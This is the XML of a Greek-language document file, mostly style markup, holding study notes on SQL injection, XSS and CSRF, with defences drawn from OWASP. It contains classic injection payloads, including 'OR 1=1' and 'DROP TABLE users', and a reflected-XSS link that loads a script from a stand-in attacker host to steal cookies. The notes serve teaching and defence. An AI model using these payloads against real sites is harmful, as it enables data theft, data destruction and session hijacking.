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margin-top="0.139in" fo:margin-bottom="0.0835in" loext:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:text-properties officeooo:paragraph-rsid="0020197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1" fo:font-size="12pt" fo:language="el" fo:country="GR" style:font-name-asian="Liberation Serif1" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif1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1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:paragraph-rsid="0019e968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1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="0016ff00" officeooo:paragraph-rsid="0016ff00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1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="00184a31" officeooo:paragraph-rsid="00184a31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1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="0018ee89" officeooo:paragraph-rsid="0018ee89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1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="0019e968" officeooo:paragraph-rsid="0019e968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font-name="Liberation Serif1" fo:font-size="12pt" fo:language="en" fo:country="US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font-name="Liberation Serif1" fo:font-size="12pt" fo:language="en" fo:country="US" officeooo:paragraph-rsid="0016ff00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font-name="Liberation Serif1" fo:font-size="12pt" fo:language="en" fo:country="US" officeooo:paragraph-rsid="001c7aab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font-name="Liberation Serif1" fo:font-size="12pt" fo:language="en" fo:country="US" officeooo:rsid="0016ff00" officeooo:paragraph-rsid="0016ff00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1c7aab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1c7aab" officeooo:paragraph-rsid="001c7aab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1d0808" officeooo:paragraph-rsid="001d0808"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0020197d"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" loext:contextual-spacing="false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paragraph-rsid="0020197d"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Heading_20_1" style:master-page-name="PM2">
      <style:paragraph-properties style:page-number="auto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3">
      <style:text-properties officeooo:paragraph-rsid="0020197d"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false" style:writing-mode="lr-tb"/>
      <style:text-properties style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR" style:font-name-asian="Liberation Serif1" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="0020197d"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" loext:contextual-spacing="false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paragraph-rsid="0020197d"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Heading_20_5">
      <style:text-properties officeooo:paragraph-rsid="0020197d"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR" style:font-name-asian="Liberation Serif1" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="001e3a97" style:font-name-asian="Liberation Serif1" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="001c7aab" style:font-name-asian="Liberation Serif1" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR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T5" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR" fo:font-style="italic" style:font-name-asian="Liberation Serif1" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-name-complex="Liberation Serif1" style:font-size-complex="12pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="en" fo:country="US" style:font-name-asian="Liberation Serif1" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Liberation Sans1" fo:font-size="16pt" fo:language="el" fo:country="GR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8" style:family="text">
      <style:text-properties officeooo:rsid="0016ff00"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="0017fa79"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="0019e968"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="001c7a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SQL injection</text:h>
      <text:p text:style-name="P18">Είναι μια τεχνική (hacking) για επίθεση σε εφαρμογές που διαχειρίζονται βάσεις δεδομένων (data-driven). Με την τεχνική αυτή εισάγεται (injection) από τον χρήστη (όπως μέσω μιας φόρμας) κακόβουλο σκριπτ με σκοπό την αλλοίωση του τελικού sql ερωτήματος.</text:p>
      <text:h text:style-name="P28" text:outline-level="5">Παράδειγμα</text:h>
      <text:p text:style-name="P18">Έστω ο κώδικας (σε php):</text:p>
      <text:p text:style-name="P27">$statement = "SELECT * FROM users WHERE password = $password";</text:p>
      <text:p text:style-name="P18">Αν ο χρήστης εισάγει αντί του password: </text:p>
      <text:p text:style-name="P27">'' OR 1 = 1</text:p>
      <text:p text:style-name="P18">το τελικό ερώτημα διαμορφώνεται έτσι:</text:p>
      <text:p text:style-name="P27">$statement = "SELECT * FROM users WHERE password = '' OR 1 = 1";</text:p>
      <text:p text:style-name="P18">και επειδή η πρόταση WHERE είναι αληθής, το ερώτημα θα εκτελεστεί.</text:p>
      <text:h text:style-name="P28" text:outline-level="5">Παράδειγμα</text:h>
      <text:p text:style-name="P18">Έστω ο κώδικας (σε php):</text:p>
      <text:p text:style-name="P27">$statement = "SELECT * FROM userinfo WHERE id = $a_variable";</text:p>
      <text:p text:style-name="P18">Αν ο χρήστης εισάγει:</text:p>
      <text:p text:style-name="P27">1; DROP TABLE users</text:p>
      <text:p text:style-name="P18">το τελικό ερώτημα διαμορφώνεται έτσι:</text:p>
      <text:p text:style-name="P27">SELECT * FROM userinfo WHERE id = 1; DROP TABLE users;</text:p>
      <text:p text:style-name="P18">και η πρόταση "DROP TABLE users" θα εκτελεστεί.</text:p>
      <text:h text:style-name="P28" text:outline-level="5">Παράδειγμα</text:h>
      <text:p text:style-name="P18">έστω το URL: http://books.example.com/showReview.php?ID=5</text:p>
      <text:p text:style-name="P18">με αντίστοιχο ερώτημα: </text:p>
      <text:p text:style-name="P27">SELECT * FROM bookreviews WHERE ID = ID;</text:p>
      <text:p text:style-name="P18">αν δώσουμε:</text:p>
      <text:p text:style-name="P27">http://books.example.com/showReview.php?ID=5 OR 1=1</text:p>
      <text:p text:style-name="P18">και</text:p>
      <text:p text:style-name="P27">http://books.example.com/showReview.php?ID=5 AND 1=2</text:p>
      <text:p text:style-name="P18">που αντιστοιχεί στα ερωτήματα:</text:p>
      <text:p text:style-name="P25">SELECT * FROM bookreviews WHERE ID = '5' OR '1'='1';</text:p>
      <text:p text:style-name="P25">SELECT * FROM bookreviews WHERE ID = '5' AND '1'='2';</text:p>
      <text:p text:style-name="P18">Αν ο σέρβερ απαντήσει, θα σημαίνει ότι δεν κάνει έλεγχο στις τιμές και αυτό τον καθιστά ευάλωτο.</text:p>
      <text:h text:style-name="P23" text:outline-level="3">Αντιμετώπιση (https://www.owasp.org)</text:h>
      <text:h text:style-name="P3" text:outline-level="4">Πρωτεύουσα άμυνα</text:h>
      <text:h text:style-name="P28" text:outline-level="5">Χρήση Prepared Statements (Παραμετροποιημένα Ερωτήματα)</text:h>
      <text:p text:style-name="P18">Η χρήση Prepared Statements είναι ένας ενδεδειγμένος τρόπος γραφής σωστών ερωτημάτων.</text:p>
      <text:h text:style-name="P28" text:outline-level="5"><text:soft-page-break/>Χρήση Stored Procedures</text:h>
      <text:p text:style-name="P18">Τα ερωτήματα αποθηκεύονται στη βάση δεδομένων και καλούνται από την εφαρμογή.</text:p>
      <text:h text:style-name="P28" text:outline-level="5">Η χρήση χαρακτήρων διαφυγής (escape characters)</text:h>
      <text:p text:style-name="P18">Με την τεχνική αυτή οι χαρακτήρες γίνονται “escaped” πριν χρησιμοποιηθούν στο ερώτημα.</text:p>
      <text:p text:style-name="P18">Ως καλή πρόταση θεωρείται και η μετατροπή σε δεκαεξαδικής μορφής κωδικοποίηση.</text:p>
      <text:h text:style-name="P3" text:outline-level="4">Δευτερεύουσα άμυνα</text:h>
      <text:h text:style-name="P28" text:outline-level="5">Δικαιώματα</text:h>
      <text:p text:style-name="P18">Πρέπει να γίνεται πιο προσεκτικός έλεγχος για το ποιός έχει δικαιώματα και ποιά.</text:p>
      <text:h text:style-name="P28" text:outline-level="5">Λίστα</text:h>
      <text:p text:style-name="P20"><text:span text:style-name="T3">Γίνεται χρήση λίστας σύμφωνα με την οποία τα δεδομένα που εισάγει ο χρήστης πρέπει να περιέχονται σε μια συγκεκριμένη λίστα.</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3"/></text:p>
      <text:h text:style-name="P22" text:outline-level="1">Cross-site scripting (XSS)</text:h>
      <text:p text:style-name="P19">Είναι ένα κενό ασφάλειας που συναντάται περισσότερο σε εφαρμογές διαδικτύου.</text:p>
      <text:p text:style-name="P19">Μέσω xss ο χάκερ μπορεί να εισάγει (inject) client-side σκριπτ (ουσιαστικά javascript) σε ιστοσελίδες.</text:p>
      <text:p text:style-name="P19">Το κακόβουλο σκριπτ εκτελείται στο πρόγραμμα περιήγησης του χρήστη δίνοντας τη δυνατότητα στον χάκερ να έχει πρόσβαση σε ευαίσθητα δεδομένα.</text:p>
      <text:p text:style-name="P19">Ο όρος, σταδιακά επεκτάθηκε και σε μη javascript κώδικα όπως ActiveX, java, VBScript, Flash ακόμα και σε html.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Τύποι xss</text:h>
      <text:p text:style-name="P19">Μπορούμε να διακρίνουμε το xss σκρίπτ σε δύο τύπους.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Reflected (non-persistent)</text:h>
      <text:p text:style-name="P19">Σε αυτή την περίπτωση το σκρίπτ μπορεί να εισαχθεί κρυφά μέσα σε ένα πεδίο φόρμας ή σε ένα URL.</text:p>
      <text:p text:style-name="P19">Όταν ο χρήστης καλέσει το URL ή κάνει αποστολή της φόρμας ο σέρβερ θα επιστρέψει ένα αποτέλεσμα που θα περιέχει το αρχικά εισαγόμενο σκρίπτ το οποίο θα εκτελεστεί στη μεριά του χρήστη. Από 'δω και ο όρος reflected.</text:p>
      <text:p text:style-name="P19">Κλασικό παράδειγμα οι φόρμες αναζήτησης όπου ο χρήστης εισάγει έναν όρο για αναζήτηση έστω «υπολογιστής», αν δίπλα προστεθεί και το σκριπτ:</text:p>
      <text:p text:style-name="P26">&lt;script src = "..."&gt;</text:p>
      <text:p text:style-name="P19">τότε ο όρος γίνεται:</text:p>
      <text:p text:style-name="P26">υπολογιστής&lt;script src = "..."&gt;</text:p>
      <text:p text:style-name="P19">Αν υποθέσουμε ότι ο σέρβερ στην πρώτη περίπτωση επιστρέφει:</text:p>
      <text:p text:style-name="P26">Δεν βρέθηκε το προϊόν υπολογιστής</text:p>
      <text:p text:style-name="P19">Στην δεύτερη περίπτωση (με το σκρίπτ να ακολουθεί) θα επιστρέφει:</text:p>
      <text:p text:style-name="P26">Δεν βρέθηκε το προϊόν υπολογιστής&lt;script src = "..."&gt;</text:p>
      <text:p text:style-name="P19">Το σκρίπτ θα εκτελεστεί στη μεριά του χρήστη με ότι κακόβουλο περιέχει.</text:p>
      <text:p text:style-name="P19">Αυτό μπορεί να είναι για παράδειγμα η κλοπή του cookie του χρήστη και η αποστολή του στον χάκερ. Στη συνέχεια ο χάκερ μπορεί να αντιγράψει το cookie στον δικό του browser και να συνδεθεί με το session του χρήστη στην εφαρμογή (π.χ. e-shop) που είναι ήδη συνδεδεμένος ο χρήστης.</text:p>
      <text:p text:style-name="P19">Ένα άλλο παράδειγμα είναι όταν ο χρήστης λαμβάνει ένα email (δόλωμα) με ένα λινκ το οποίο μπορεί <text:soft-page-break/>να γράφει:</text:p>
      <text:p text:style-name="P26">Απίθανες προσφορές στο offers-e-shop.gr</text:p>
      <text:p text:style-name="P19">Αλλά στο href (που δεν βλέπει ο χρήστης) να γράφει:</text:p>
      <text:p text:style-name="P26">href = “http://www.offers-e-shop.gr?q=offers&lt;script%20src='http://www.mybadsite.gr/badscript.js'&gt;”</text:p>
      <text:p text:style-name="P19">Όταν κάνει κλικ στο λινκ θα καλέσει το URL:</text:p>
      <text:p text:style-name="P26">http://www.offers-e-shop?q=offers&lt;script%20src='http://www.mybadsite.gr/badscript.js'&gt;</text:p>
      <text:p text:style-name="P19">Ο σέρβερ θα του επιστρέψει και το σκριπτ το οποίο θα εκτελεστεί στη μεριά του χρήστη.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Persistent attack</text:h>
      <text:p text:style-name="P19">Αυτός ο τύπος επίθεσης (xss) έχει το χαρακτηριστικό ότι τι κακόβουλο σκριπτ αποθηκεύεται στον σέρβερ και μένει εκεί μόνιμα (persistent).</text:p>
      <text:p text:style-name="P19">Για παράδειγμα σε έναν ευάλωτο σε xss επιθέσεις ιστότοπο τύπου blog, ο χάκερ αφού κάνει εγγραφή, αναρτεί ένα κείμενο με ένα λινκ.</text:p>
      <text:p text:style-name="P19">Το λινκ αυτό μπορεί να είναι ένα δόλωμα το οποίο καλεί ένα URL όπως αυτό που αναφέρθηκε παραπάνω:</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Άμυνα</text:h>
      <text:p text:style-name="P19">Από τα παραπάνω παραδείγματα γίνεται φανερό ότι ο σέρβερ δέχεται τα δεδομένα χωρίς να τα ελέγχει (server side validation).</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">encoding/escaping.</text:h>
      <text:p text:style-name="P19">Άρα, ως πρώτη άμυνα μπορούμε να θεωρήσουμε τον καλό έλεγχο των δεδομένων με τεχνικές όπως encoding/escaping.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Cookie security</text:h>
      <text:p text:style-name="P19">Επειδή μέσω xss αυτό που γίνεται συνήθως είναι η κλοπή του cookie, μπορούμε στο sessions να προσθέσουμε και το IP του χρήστη για περισσότερη ασφάλεια.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Disabling scripts</text:h>
      <text:p text:style-name="P19">Η απενεργοποίηση του σκριπτ στο πρόγραμμα περιήγησης μπορεί να προστατέψει τον χρήστη αλλά θα του στερήσει λειτουργικότητα και ταχύτητα.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>Content Security Policy (CSP)</text:h>
      <text:p text:style-name="P19">Αναδυόμενη τεχνική σύμφωνα με την οποία ένας ιστότοπος θα δέχεται κώδικα προερχόμενο μόνο από τον συγκεκριμένο ιστότοπο.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Παρόμοιες απειλές</text:h>
      <text:p text:style-name="P19">Μία παρόμοια απειλή με αυτή του xss είναι η (CSRF/XSRF)</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Cross-site request forgery (CSRF/XSRF)</text:h>
      <text:p text:style-name="P19">Εδώ ο χάκερ εισάγει σκριπτ στη μεριά του χρήστη, ο κώδικας εκτελείται με αιτήματα (requests) προς τον σέρβερ για τα οποία ο χρήστης δεν γνωρίζει.</text:p>
      <text:p text:style-name="P19">Δηλαδή ο σέρβερ δέχεται αιτήματα από έναν πιστοποιημένο χρήστη και τα εκτελεί, δεν γνωρίζει όμως ούτε ο σέρβερ ούτε ο χρήστης ότι τα αιτήματα αυτά γίνονται από κρυφό σκριπτ για λογαριασμό του χάκερ.</text:p>
      <text:p text:style-name="P1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dc:date>2015-12-20T15:12:01.616452995</dc:date>
    <meta:editing-duration>PT1H7M50S</meta:editing-duration>
    <meta:editing-cycles>10</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="90" meta:word-count="875" meta:character-count="5748" meta:non-whitespace-character-count="4961"/>
  </office:meta>
</office:document-meta>
</file>